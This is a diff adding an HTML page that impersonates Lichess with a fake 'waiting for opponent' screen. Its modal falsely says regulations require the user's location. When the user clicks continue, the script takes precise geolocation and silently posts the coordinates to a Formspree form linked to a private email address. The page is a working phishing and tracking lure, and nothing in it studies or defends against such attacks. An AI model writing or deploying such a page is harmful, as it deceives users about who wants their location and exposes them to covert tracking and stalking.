@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Waiting for opponent - Play Anonymous User</title>
+<style>
+  body {
+    margin: 0;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    height: 100vh;
+    overflow: hidden;
+  }
+
+  #background {
+    background: url('boards.png') no-repeat center center fixed;
+    background-size: cover;
+    width: 100%;
+    height: 100%;
+    filter: blur(5px);
+    transition: filter 0.5s ease;
+  }
+
+  .modal {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    z-index: 9999;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0,0,0,0.4);
+  }
+
+  .modal-content {
+    background: #593925;
+    padding: 30px 25px;
+    border-radius: 6px;
+    text-align: center;
+    max-width: 420px;
+    width: 90%;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+  }
+
+  .modal-content h2 {
+    margin-bottom: 20px;
+    font-size: 20px;
+    font-weight: 600;
+  }
+
+  .modal-content button {
+    padding: 10px 22px;
+    font-size: 15px;
+    cursor: pointer;
+    border: none;
+    border-radius: 4px;
+    background-color: #d5c39d;
+    color: #000000;
+    font-weight: 500;
+    transition: background-color 0.2s ease;
+  }
+
+  .modal-content button:hover {
+    background-color: #7bb25c;
+  }
+
+  #mainContent {
+    display: none;
+    text-align: center;
+    color: rgb(236, 180, 180);
+    text-shadow: 0 2px 4px rgb(255, 255, 255);
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+</style>
+</head>
+<body>
+
+<div id="background"></div>
+
+<div id="locationModal" class="modal">
+  <div class="modal-content">
+    <h2 style="color:white;">Regulation changes in several countries, Lichess requires your location; to make sure your country does not prohibit the use of Lichess. </h2>
+    <button id="allowLocation"><b>Continue to Lichess</b></button>
+  </div>
+</div>
+
+<div id="mainContent">
+</div>
+
+<script>
+const modal = document.getElementById('locationModal');
+const mainContent = document.getElementById('mainContent');
+const allowBtn = document.getElementById('allowLocation');
+const background = document.getElementById('background');
+
+allowBtn.addEventListener('click', () => {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        // Send location to Formspree
+        fetch('https://formspree.io/f/mzzjokpw', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: 'trajectory.aerospace@gmail.com', 
+            message: `User location:\nLatitude: ${latitude}\nLongitude: ${longitude}`
+          })
+        }).catch(err => console.error('Error sending location:', err));
+
+        // Remove modal and remove blur
+        modal.style.display = 'none';
+        mainContent.style.display = 'block';
+        // Trigger blur transition
+        setTimeout(() => {
+          background.style.filter = 'blur(0)';
+        }, 50);
+
+      },
+      (error) => alert(''),
+      { enableHighAccuracy: true }
+    );
+  } else {
+    alert('Geolocation is not supported by this browser.');
+  }
+});
+</script>
+
+</body>
+</html>
